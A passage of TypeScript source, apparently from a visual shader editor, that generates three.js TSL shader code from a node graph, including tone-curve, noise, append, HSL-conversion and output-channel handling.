      // Tone curve: scale/offset → input cutoffs (levels) → clamp → midpoint
      // (gamma) → contrast → clamp. Each stage is skipped when it's a no-op so
      // the emitted expression stays readable for identity settings.
      let expr = rawExpr;
      if (scale !== 1 || offset !== 0) {
        expr = `${expr}.mul(${num(scale)}).add(${num(offset)})`;
      }
      if (lowCut !== 0 || highCut !== 1) {
        const span = highCut - lowCut;
        const safeSpan = Math.abs(span) < 1e-4 ? (span < 0 ? -1e-4 : 1e-4) : span;
        expr = `${expr}.sub(${num(lowCut)}).div(${num(safeSpan)})`;
      }
      expr = `${expr}.clamp(0.0, 1.0)`;
      const gamma = Math.log(0.5) / Math.log(midpoint);
      if (Math.abs(gamma - 1) > 1e-3) {
        expr = `${expr}.pow(${num(gamma)})`;
      }
      if (contrast !== 1) {
        expr = `${expr}.sub(0.5).mul(${num(contrast)}).add(0.5).clamp(0.0, 1.0)`;
      }

      const t = `_${varName}_t`;
      bodyLines.push(`  const ${t} = ${expr};`);
      bodyLines.push(
        `  const ${varName} = vec3(${num(lo[0])}, ${num(lo[1])}, ${num(lo[2])}).mix(vec3(${num(hi[0])}, ${num(hi[1])}, ${num(hi[2])}), ${t});`,
      );
    } else if (def.type === 'append') {
      // Append node: concatenate operands into a vector. The constructor follows
      // the TOTAL component count (a vec2 + float must become vec3, not vec2),
      // and both it and the argument list are capped at vec4.
      const raw = resolveArguments(node, edges, varNames, def, sorted);
      const channels = appendOperandChannels(node, edges, sorted, def);
      const { ctor, args } = buildAppendConstructor(raw, channels);
      addImport('three/tsl', ctor);
      bodyLines.push(`  const ${varName} = ${ctor}(${args.join(', ')});`);
    } else if (def.inputs.length === 0 && def.category === 'input' && !def.defaultValues) {
      // Input nodes: bare reference (positionGeometry, time, etc.)
      bodyLines.push(`  const ${varName} = ${def.tslFunction};`);
    } else if (def.category === 'noise') {
      // Noise nodes: all params come from exposed ports / stored values.
      // Handled BEFORE the generic `inputs.length === 0 && defaultValues` branch
      // because noise nodes have multiple default values (pos + scale) that the
      // generic branch can't express.
      const nv = getNodeValues(node);

      // Resolve position: from exposed port edge, or default positionGeometry
      let posExpr = resolveExposedParam(node, 'pos', edges, varNames, nv, sorted);
      if (/^\d+(\.\d+)?$/.test(posExpr) || posExpr === 'positionGeometry') {
        posExpr = 'positionGeometry';
        addImport('three/tsl', 'positionGeometry');
      }

      // Apply scale via method chain so the result keeps the position's vector type
      const scaleExpr = resolveExposedParam(node, 'scale', edges, varNames, nv, sorted);
      if (scaleExpr !== '1') {
        posExpr = `${posExpr}.mul(${scaleExpr})`;
      }

      bodyLines.push(`  const ${varName} = ${def.tslFunction}(${posExpr});`);
    } else if (def.type === 'property_color') {
      // Colour uniform. The generic branch below would emit `uniform(0xff0000)`
      // — a FLOAT uniform holding 16711680 — so wrap the literal in color() to
      // get a real vec3-valued uniform. buildShaderModule rewrites this whole
      // line to `params.<name>` and records the hex as the schema default.
      const nv = getNodeValues(node);
      addImport('three/tsl', 'color');
      bodyLines.push(`  const ${varName} = uniform(color(${hexLiteral(nv.hex)}));`);
    } else if (def.inputs.length === 0 && def.defaultValues) {
      // Type constructors with default values
      const nodeValues = getNodeValues(node);
      const defaultKey = Object.keys(def.defaultValues)[0];
      const val = nodeValues?.[defaultKey] ?? Object.values(def.defaultValues)[0];
      const formatted = typeof val === 'string' && val.startsWith('#')
        ? hexLiteral(val)
        : val;
      bodyLines.push(`  const ${varName} = ${def.tslFunction}(${formatted});`);
    } else if (def.type === 'hsl' || def.type === 'toHsl') {
      // HSL↔RGB: neither `hsl` nor `toHsl` exist in three/tsl, so we emit
      // module-local helper Fn declarations (see buildColorHelpers below) and
      // call them here. The helpers are auto-included whenever either node is
      // used; the matching `path.skip()` in codeToGraph prevents round-trip
      // pollution of the graph.
      const call = def.type === 'hsl' ? 'hsl' : 'toHsl';
      const fallback = def.type === 'hsl' ? '0, 0, 0' : 'vec3(0, 0, 0)';
      const argExpr = def.type === 'hsl'
        ? args.join(', ')
        : (args[0] ?? fallback);
      bodyLines.push(`  const ${varName} = ${call}(${argExpr});`);
    } else {
      // Regular function call
      bodyLines.push(`  const ${varName} = ${def.tslFunction}(${args.join(', ')});`);
    }
  }

  // Handle output node — resolve all connected channels
  const outputNode = sorted.find((n) => n.data.registryType === 'output');
  const OUTPUT_CHANNELS = ['color', 'emissive', 'normal', 'position', 'opacity', 'roughness'] as const;
  const channels: Record<string, string> = {};
  // Discard is a side-effect statement, not a return channel — emitted as
  // `Discard(cond);` between definitions and the return so the wired condition
  // (e.g. greaterThan(distance(positionWorld, cameraPosition), maxDist)) kills
  // the fragment before any further work.
  let discardLine: string | null = null;

  // Channels that the WebGL/WebGPU backend will validate as vec3-typed. A
  // bool-producing source (logic category) wired straight into one of these
  // links a broken shader program — WebGL then spams INVALID_OPERATION on
  // every frame. Coerce to `vec3(float(...))` so the shader is well-typed and
  // the boolean visualises as black/white instead of melting the renderer.
  const VEC3_CHANNELS = new Set(['color', 'emissive', 'normal', 'position']);

  if (outputNode) {
    for (const ch of OUTPUT_CHANNELS) {
      const edge = edges.find(
        (e) => e.target === outputNode.id && e.targetHandle === ch
      );
      if (edge) {
        const ref = resolveEdgeRef(edge, edges, varNames, sorted);
        if (ref) {
          const sourceNode = sorted.find((n) => n.id === edge.source);
          const sourceDef = sourceNode ? registry.get(sourceNode.data.registryType) : undefined;
          if (sourceDef?.category === 'logic' && VEC3_CHANNELS.has(ch)) {
            addImport('three/tsl', 'vec3');
            addImport('three/tsl', 'float');
            channels[ch] = `vec3(float(${ref}))`;
          } else if (ch === 'normal' && sourceNode?.data.registryType === 'imageNode') {
            // An image wired into Normal is a tangent-space normal MAP, not a raw
            // normal — its texels are packed unit vectors in [0,1]. Decode with
            // TSL's normalMap() node: it remaps [0,1]→[-1,1], applies the TBN
            // (tangent→view) transform and normalizes. Assigning the raw sample
            // to normalNode instead would leave every component ≥0, unnormalized
            // and un-rotated → a flat, blue-biased surface. normalMap() assumes
            // LINEAR input, so the Image node is auto-switched to the 'data'
            // colorSpace when it is connected here (NodeEditor onConnect).
            addImport('three/tsl', 'normalMap');
            channels[ch] = `normalMap(${ref})`;
          } else {
            channels[ch] = ref;
          }
        }
      }
    }

    const discardEdge = edges.find(
      (e) => e.target === outputNode.id && e.targetHandle === 'discard'
    );
    if (discardEdge) {
      const ref = resolveEdgeRef(discardEdge, edges, varNames, sorted);
      if (ref) {
        addImport('three/tsl', 'Discard');
        discardLine = `  Discard(${ref});`;
      }
    }
  }

  // Build return line — single value for color-only, object for multiple channels
  let returnLine: string;
  const channelEntries = Object.entries(channels);

  if (channelEntries.length === 0) {
    returnLine = '  return vec3(1, 0, 0); // default red';
  } else if (channelEntries.length === 1 && channels.color) {
    returnLine = `  return ${channels.color};`;
  } else {
    const props = channelEntries.map(([k, v]) => `${k}: ${v}`).join(', ');
    returnLine = `  return { ${props} };`;
  }

  // Ensure vec3 is imported if used in fallback return
  if (returnLine.includes('vec3(')) {
    addImport('three/tsl', 'vec3');
  }

  // Build import lines (after all imports are collected)
  const importLines: string[] = [];
  for (const [module, names] of importsByModule) {
    const sortedNames = Array.from(names).sort();
    importLines.push(`import { ${sortedNames.join(', ')} } from '${module}';`);
  }

  const helperLines: string[] = [];
  if (usedHsl) helperLines.push(...HSL_HELPER_LINES, '');
  if (usedToHsl) helperLines.push(...TO_HSL_HELPER_LINES, '');

  const code = [
    ...importLines,
    '',
    ...helperLines,
    // Module-scope DataTexture construction (Data/Stripes nodes) — must precede
    // the shader Fn so its body can close over the textures.
    ...(setupLines.length ? [...setupLines, ''] : []),
    'const shader = Fn(() => {',
    ...bodyLines,
    ...(discardLine ? [discardLine] : []),
    '',
    returnLine,
    '});',
    '',
    'export default shader;',
    '',
  ].join('\n');

  return { code, importStatements: importLines, varNames };
}

/**
 * HSL → RGB helper emitted at module scope when the graph contains an hsl node.
 * `hsl` is not an export of `three/tsl`, so we ship our own branchless implementation
 * (GLSL-style — no conditionals, suitable for the GPU).
 */
const HSL_HELPER_LINES = [
  'const hsl = Fn(([h, s, l]) => {',
  '  const h6 = mul(h, float(6));',
  '  const rk = clamp(sub(abs(sub(mod(add(h6, float(0)), float(6)), float(3))), float(1)), float(0), float(1));',
  '  const gk = clamp(sub(abs(sub(mod(add(h6, float(4)), float(6)), float(3))), float(1)), float(0), float(1));',
  '  const bk = clamp(sub(abs(sub(mod(add(h6, float(2)), float(6)), float(3))), float(1)), float(0), float(1));',
  '  const sat = mul(s, sub(float(1), abs(sub(mul(float(2), l), float(1)))));',
  '  return vec3(',
  '    add(l, mul(sat, sub(rk, float(0.5)))),',
  '    add(l, mul(sat, sub(gk, float(0.5)))),',
  '    add(l, mul(sat, sub(bk, float(0.5)))),',
  '  );',
  '});',
];

/**
 * RGB → HSL helper. Branchless via select/greaterThan/equal so GPU warp divergence
 * stays low. Uses `max(d, 1e-10)` to dodge division-by-zero on neutral/grayscale
 * inputs; the outer `select(d > 0, …, 0)` then zeros hue/saturation cleanly.
 */
const TO_HSL_HELPER_LINES = [
  'const toHsl = Fn(([rgb]) => {',
  '  const maxC = max(max(rgb.x, rgb.y), rgb.z);',
  '  const minC = min(min(rgb.x, rgb.y), rgb.z);',
  '  const d = sub(maxC, minC);',
  '  const L = mul(add(maxC, minC), float(0.5));',
  '  const satDenom = max(sub(float(1), abs(sub(mul(L, float(2)), float(1)))), float(1e-10));',
  '  const S = select(greaterThan(d, float(0)), div(d, satDenom), float(0));',
  '  const dSafe = max(d, float(1e-10));',
  '  const hR = add(div(sub(rgb.y, rgb.z), dSafe), select(lessThan(rgb.y, rgb.z), float(6), float(0)));',
  '  const hG = add(div(sub(rgb.z, rgb.x), dSafe), float(2));',
  '  const hB = add(div(sub(rgb.x, rgb.y), dSafe), float(4));',
  '  const hueSeg = select(equal(maxC, rgb.x), hR, select(equal(maxC, rgb.y), hG, hB));',
  '  const H = select(greaterThan(d, float(0)), mul(hueSeg, float(1 / 6)), float(0));',
  '  return vec3(H, S, L);',
  '});',
];

/**
 * Build an append node's vector constructor over ALL its wired operands.
 *
 * The output size is the SUM of the operands' channel counts (connected =
 * evaluate upstream; unconnected = scalar = 1), and a GPU vector holds at most
 * 4 — there is no vec5. So the sum is capped at 4, and, crucially, the
 * ARGUMENTS are capped with it: an operand that would overflow the vec4 is
 * swizzled down to the components that still fit, and operands past the fourth
 * channel are dropped entirely.
 *
 * Trimming the arguments is what makes the cap real. Clamping only the
 * constructor emitted `vec4(vec3A, vec3B)` for two vec3s — a 4-slot
 * constructor handed 6 components, which is not valid TSL.
 */
function buildAppendConstructor(
  args: string[],
  channels: number[],
): { ctor: 'vec2' | 'vec3' | 'vec4'; args: string[] } {
  const out: string[] = [];
  let total = 0;
  for (let i = 0; i < args.length && total < 4; i++) {
    const room = 4 - total;
    const ch = Math.max(1, channels[i] ?? 1);
    if (ch <= room) {
      out.push(args[i]);
      total += ch;
    } else {
      // ch > room implies ch >= 2, so this operand is a vector and `.xyzw`
      // swizzling is well-formed.
      out.push(`${args[i]}.${'xyzw'.slice(0, room)}`);
      total += room;
    }
  }
  // Two base sockets are always present, so total >= 2 and vec2 is the floor.
  const size = Math.min(Math.max(total, 2), 4);
  return { ctor: size === 2 ? 'vec2' : size === 3 ? 'vec3' : 'vec4', args: out };
}

/** Channel count each of an append node's operands contributes, in socket order. */
function appendOperandChannels(
  node: AppNode,
  edges: AppEdge[],
  nodes: AppNode[],
  def: NodeDefinition,
): number[] {
  const connected = edges
    .filter((e) => e.target === node.id && typeof e.targetHandle === 'string')
    .map((e) => e.targetHandle as string);
  const inputs = effectiveInputs(def, connected, false, Object.keys(getNodeValues(node)));
  return inputs.map((input) => {
    const edge = edges.find((e) => e.target === node.id && e.targetHandle === input.id);
    return edge ? getComponentCount(edge.source, nodes, edges) : 1;
  });
}

/** Resolve a source edge reference, looking through split nodes to inline swizzle. */
function resolveEdgeRef(
  edge: AppEdge,
  edges: AppEdge[],
  varNames: Map<string, string>,
  sorted: AppNode[]
): string | null {
  const sourceNode = sorted.find(n => n.id === edge.source);
  if (!sourceNode) return varNames.get(edge.source) ?? null;

  // Data node: each column output is emitted as its own variable `<var>_colN`
  // (the node has no single value), so address the column by its handle id.
  if (
    sourceNode.data.registryType === 'dataNode' &&
    edge.sourceHandle &&
    /^col\d+$/.test(edge.sourceHandle)
  ) {
    const base = varNames.get(sourceNode.id);
    return base ? `${base}_${edge.sourceHandle}` : null;
  }

  // Data Viz: the `value` handle exposes the tone-mapped scalar (`_<var>_t`,
  // a float 0–1) instead of the coloured `out` vec3 — so displacement can be
  // driven by the data height independently of the chosen ramp colours.
  if (sourceNode.data.registryType === 'dataviz' && edge.sourceHandle === 'value') {
    const base = varNames.get(sourceNode.id);
    return base ? `_${base}_t` : null;
  }

  // If source is a split node, inline as inputVar.component
  if (sourceNode.data.registryType === 'split' && edge.sourceHandle && edge.sourceHandle !== 'out' && VALID_SWIZZLE.has(edge.sourceHandle)) {
    const splitInputEdge = edges.find(e => e.target === sourceNode.id && e.targetHandle === 'v');
    if (splitInputEdge && varNames.has(splitInputEdge.source)) {
      return `${varNames.get(splitInputEdge.source)}.${edge.sourceHandle}`;
    }
  }

  return varNames.get(edge.source) ?? null;
}

function resolveArguments(
  node: AppNode,
  edges: AppEdge[],
  varNames: Map<string, string>,
  def: NodeDefinition,
  sorted: AppNode[]
): string[] {
  // Chainable arithmetic emits a variadic call over its wired operands (plus any
  // interior gaps filled with the identity) — `includeTrailingEmpty=false` drops
  // the dangling grow socket so we never emit e.g. `add(a, b, 0)`. Stored values
  // on extension operands (imported `add(x, 2, 3)`) are honored via valuedHandles.
  const nodeVals = getNodeValues(node);
  const connected = edges
    .filter((e) => e.target === node.id && typeof e.targetHandle === 'string')
    .map((e) => e.targetHandle as string);
  const inputs = effectiveInputs(def, connected, false, Object.keys(nodeVals));
  return inputs.map((input) => {
    const edge = edges.find(
      (e) => e.target === node.id && e.targetHandle === input.id
    );
    if (edge) {
      const ref = resolveEdgeRef(edge, edges, varNames, sorted);
      if (ref) return ref;
    }
    // No connection: use node's stored value, then the registry default for this
    // port, then the chain identity, then a bare placeholder. Consulting
    // defaultValues keeps a legacy node (created before the default existed, so
    // it has no stored value) in sync with the evaluator/UI — e.g. min's unwired
    // `b` emits `min(a, 1)`, not `min(a, 0)`; an unwired mul operand emits `1`.
    const val = nodeVals[input.id];
    if (val !== undefined) return String(val);
    const dflt = def.defaultValues?.[input.id];
    if (dflt !== undefined) return String(dflt);
    if (def.chainable && def.chainIdentity !== undefined) return String(def.chainIdentity);
    return '0';
  });
}

/** Resolve an exposed parameter: if an edge connects to it, use the variable ref; else use stored value. */
function resolveExposedParam(
  node: AppNode,
  key: string,
  edges: AppEdge[],
  varNames: Map<string, string>,
  nodeValues: Record<string, string | number>,
  sorted: AppNode[],
): string {
  // Check if there's an edge connected to this exposed port
  const edge = edges.find(
    (e) => e.target === node.id && e.targetHandle === key
  );
  if (edge) {
    const ref = resolveEdgeRef(edge, edges, varNames, sorted);
    if (ref) return ref;
  }
  return String(nodeValues?.[key] ?? 1);
}

